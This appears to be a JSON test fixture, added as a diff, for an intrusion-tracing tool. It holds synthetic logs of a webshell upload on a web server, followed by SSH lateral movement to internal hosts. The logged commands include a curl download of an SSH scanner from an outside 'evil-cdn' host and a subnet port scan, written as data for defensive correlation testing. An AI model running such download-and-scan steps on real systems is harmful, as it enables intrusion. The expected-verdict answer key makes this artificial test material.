@@ -1,0 +1,303 @@
+{
+  "investigation_intent": "外网 IP 203.0.113.55 于 2026-06-22 上午攻击 WEB 区，查第一个攻破点与 SSH 横向范围",
+  "scenarios": ["S1", "S2", "S3"],
+  "params": {
+    "attacker_ip": "203.0.113.55",
+    "alert_time": "2026-06-22T09:08:05+08:00",
+    "time_start": "2026-06-22T08:00:00+08:00",
+    "time_end": "2026-06-22T12:00:00+08:00",
+    "host_ips": {
+      "web-01": "10.0.1.5",
+      "db-01": "10.0.2.10",
+      "app-02": "10.0.2.20"
+    }
+  },
+  "completeness_precheck": {
+    "overall_verdict": "full_traceable",
+    "confidence": 0.88,
+    "next_skill_blocked": false,
+    "data_gaps": []
+  },
+  "evidence_bundles": {
+    "waf_alert": [
+      {
+        "evidence_id": "waf-001",
+        "src_ip": "203.0.113.55",
+        "timestamp": "2026-06-22T09:08:05+08:00",
+        "url": "/api/upload.php?cmd=whoami",
+        "payload": "cmd=whoami&pass=xxx",
+        "action": "block",
+        "rule_id": "942100",
+        "rule_name": "SQL Injection",
+        "method": "POST",
+        "alert_id": "trace-s1-20260622-001",
+        "host": "web-01"
+      },
+      {
+        "evidence_id": "waf-002",
+        "src_ip": "203.0.113.55",
+        "timestamp": "2026-06-22T09:07:58+08:00",
+        "url": "/api/upload.php",
+        "payload": "------WebKitFormBoundary",
+        "action": "logged",
+        "rule_id": "933100",
+        "rule_name": "PHP Injection",
+        "method": "POST",
+        "alert_id": "trace-s1-20260622-002",
+        "host": "web-01"
+      }
+    ],
+    "web_access_log": [
+      {
+        "evidence_id": "web-001",
+        "src_ip": "203.0.113.55",
+        "timestamp": "2026-06-22T09:07:55+08:00",
+        "url": "/api/upload.php",
+        "method": "POST",
+        "status": 200,
+        "host": "web-01",
+        "user_agent": "Mozilla/5.0 (compatible; scanner/1.0)"
+      },
+      {
+        "evidence_id": "web-002",
+        "src_ip": "203.0.113.55",
+        "timestamp": "2026-06-22T09:08:02+08:00",
+        "url": "/api/upload.php?cmd=whoami",
+        "method": "GET",
+        "status": 200,
+        "host": "web-01",
+        "user_agent": "curl/8.5.0"
+      },
+      {
+        "evidence_id": "web-003",
+        "src_ip": "203.0.113.55",
+        "timestamp": "2026-06-22T09:10:08+08:00",
+        "url": "/upload/shell.php",
+        "method": "POST",
+        "status": 200,
+        "host": "web-01",
+        "user_agent": "curl/8.5.0"
+      }
+    ],
+    "host_exec": [
+      {
+        "evidence_id": "exec-001",
+        "event_type": "exec",
+        "host": "web-01",
+        "host_ip": "10.0.1.5",
+        "timestamp": "2026-06-22T09:10:15+08:00",
+        "listener_port": 443,
+        "listener_process": "nginx",
+        "listener_pid": 1481,
+        "pid": "88201",
+        "ppid": "88190",
+        "exe": "/bin/sh",
+        "command": ["sh", "-c", "whoami"],
+        "command_line": "sh -c whoami",
+        "cwd": "/var/www/html"
+      },
+      {
+        "evidence_id": "exec-002",
+        "event_type": "exec",
+        "host": "web-01",
+        "host_ip": "10.0.1.5",
+        "timestamp": "2026-06-22T09:12:32+08:00",
+        "listener_port": 443,
+        "listener_process": "nginx",
+        "listener_pid": 1481,
+        "pid": "88340",
+        "ppid": "88190",
+        "exe": "/usr/bin/curl",
+        "command": ["curl", "-o", "/tmp/sshscan", "http://198.51.100.5/tools/sshscan"],
+        "command_line": "curl -o /tmp/sshscan http://198.51.100.5/tools/sshscan",
+        "cwd": "/var/www/html"
+      },
+      {
+        "evidence_id": "exec-003",
+        "event_type": "exec",
+        "host": "web-01",
+        "host_ip": "10.0.1.5",
+        "timestamp": "2026-06-22T09:13:05+08:00",
+        "listener_port": 443,
+        "listener_process": "nginx",
+        "listener_pid": 1481,
+        "pid": "88355",
+        "ppid": "88190",
+        "exe": "/usr/bin/chmod",
+        "command": ["chmod", "+x", "/tmp/sshscan"],
+        "command_line": "chmod +x /tmp/sshscan",
+        "cwd": "/tmp"
+      },
+      {
+        "evidence_id": "exec-004",
+        "event_type": "exec",
+        "host": "web-01",
+        "host_ip": "10.0.1.5",
+        "timestamp": "2026-06-22T09:14:20+08:00",
+        "listener_port": 443,
+        "listener_process": "nginx",
+        "listener_pid": 1481,
+        "pid": "88380",
+        "ppid": "88190",
+        "exe": "/tmp/sshscan",
+        "command": ["/tmp/sshscan", "-t", "10.0.2.0/24", "-p", "22"],
+        "command_line": "/tmp/sshscan -t 10.0.2.0/24 -p 22",
+        "cwd": "/tmp"
+      }
+    ],
+    "host_connect": [
+      {
+        "evidence_id": "connect-001",
+        "event_type": "active_connect",
+        "host": "web-01",
+        "host_ip": "10.0.1.5",
+        "timestamp": "2026-06-22T09:12:30+08:00",
+        "listener_port": 443,
+        "listener_process": "nginx",
+        "listener_pid": 1481,
+        "pid": "88340",
+        "dst_ip": "198.51.100.5",
+        "dst_port": 80
+      },
+      {
+        "evidence_id": "connect-002",
+        "event_type": "active_connect",
+        "host": "web-01",
+        "host_ip": "10.0.1.5",
+        "timestamp": "2026-06-22T09:19:08+08:00",
+        "listener_port": 443,
+        "listener_process": "nginx",
+        "listener_pid": 1481,
+        "pid": "88410",
+        "dst_ip": "10.0.2.10",
+        "dst_port": 22
+      }
+    ],
+    "host_file_op": [
+      {
+        "evidence_id": "file-001",
+        "event_type": "file_op",
+        "host": "web-01",
+        "host_ip": "10.0.1.5",
+        "timestamp": "2026-06-22T09:10:45+08:00",
+        "listener_pid": 1481,
+        "listener_port": 443,
+        "pid": "88215",
+        "path": "/var/www/html/upload/shell.php",
+        "action": "create"
+      },
+      {
+        "evidence_id": "file-002",
+        "event_type": "file_op",
+        "host": "web-01",
+        "host_ip": "10.0.1.5",
+        "timestamp": "2026-06-22T09:12:35+08:00",
+        "listener_pid": 1481,
+        "pid": "88340",
+        "path": "/tmp/sshscan",
+        "action": "create"
+      }
+    ],
+    "ssh_auth": [
+      {
+        "evidence_id": "ssh-001",
+        "host": "db-01",
+        "host_ip": "10.0.2.10",
+        "timestamp": "2026-06-22T09:18:50+08:00",
+        "src_ip": "10.0.1.5",
+        "user": "root",
+        "result": "Failed",
+        "auth_method": "password"
+      },
+      {
+        "evidence_id": "ssh-002",
+        "host": "db-01",
+        "host_ip": "10.0.2.10",
+        "timestamp": "2026-06-22T09:19:15+08:00",
+        "src_ip": "10.0.1.5",
+        "user": "root",
+        "result": "Accepted",
+        "auth_method": "publickey"
+      },
+      {
+        "evidence_id": "ssh-003",
+        "host": "app-02",
+        "host_ip": "10.0.2.20",
+        "timestamp": "2026-06-22T09:22:40+08:00",
+        "src_ip": "10.0.1.5",
+        "user": "deploy",
+        "result": "Accepted",
+        "auth_method": "publickey"
+      }
+    ],
+    "firewall_log": [
+      {
+        "evidence_id": "fw-001",
+        "timestamp": "2026-06-22T09:19:10+08:00",
+        "src_ip": "10.0.1.5",
+        "dst_ip": "10.0.2.10",
+        "src_port": 52444,
+        "dst_port": 22,
+        "action": "allow",
+        "protocol": "tcp"
+      },
+      {
+        "evidence_id": "fw-002",
+        "timestamp": "2026-06-22T09:22:35+08:00",
+        "src_ip": "10.0.1.5",
+        "dst_ip": "10.0.2.20",
+        "src_port": 52488,
+        "dst_port": 22,
+        "action": "allow",
+        "protocol": "tcp"
+      }
+    ],
+    "dns_log": [
+      {
+        "evidence_id": "dns-001",
+        "client_ip": "10.0.1.5",
+        "timestamp": "2026-06-22T09:12:28+08:00",
+        "query": "tools.evil-cdn.example",
+        "response": "198.51.100.5",
+        "query_type": "A"
+      }
+    ],
+    "asset_inventory": [
+      {
+        "evidence_id": "asset-001",
+        "hostname": "web-01",
+        "ip": "10.0.1.5",
+        "zone": "dmz",
+        "owner": "web-team",
+        "services": ["nginx", "php-fpm"]
+      },
+      {
+        "evidence_id": "asset-002",
+        "hostname": "db-01",
+        "ip": "10.0.2.10",
+        "zone": "internal",
+        "owner": "dba-team",
+        "services": ["mysql"]
+      },
+      {
+        "evidence_id": "asset-003",
+        "hostname": "app-02",
+        "ip": "10.0.2.20",
+        "zone": "internal",
+        "owner": "app-team",
+        "services": ["java", "tomcat"]
+      }
+    ]
+  },
+  "_meta": {
+    "scenario_label": "S1 WebShell → curl 下载 → SSH 横向",
+    "expected_verdict": "confirmed_intrusion_chain",
+    "correlation_joins": [
+      "waf_to_web_access_by_ip",
+      "d2_exec_connect_same_listener",
+      "d2_exec_file_same_host",
+      "host_ip_to_ssh_auth_lateral"
+    ],
+    "missing_joins": ["web_access_to_host_exec", "host_to_cmdb"]
+  }
+}
